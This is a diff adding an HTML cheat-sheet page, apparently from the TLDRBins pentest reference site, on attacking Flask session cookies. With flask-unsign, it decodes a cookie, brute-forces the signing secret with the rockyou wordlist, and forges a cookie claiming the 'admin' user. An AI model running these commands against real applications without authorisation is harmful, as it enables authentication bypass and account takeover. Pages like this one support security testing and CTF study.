@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Flask Cookie | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/flask_cookie/">
+      <span>Flask Cookie</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@flask/">Flask</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@python/">Python</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@cookie/">Cookie</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@sign/">Sign</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@unsign/">Unsign</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="flask-cookie">Flask Cookie</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install flask-unsign
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Decode flask cookie</span>
+</span></span><span class="line"><span class="cl">flask-unsign --decode --cookie <span class="s2">&#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Brute force secret key</span>
+</span></span><span class="line"><span class="cl">flask-unsign --unsign --cookie <span class="s2">&#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&#34;</span> -w /usr/share/wordlists/rockyou.txt --no-literal-eval
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Forge flask cookie</span>
+</span></span><span class="line"><span class="cl">flask-unsign --sign --cookie <span class="s2">&#34;{&#39;logged_in&#39;: True, &#39;username&#39;: &#39;admin&#39;}&#34;</span> --secret <span class="s2">&#34;secret123&#34;</span>
+</span></span></code></pre></div></div></div>
+    
+    <script src="/copy-code-button.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
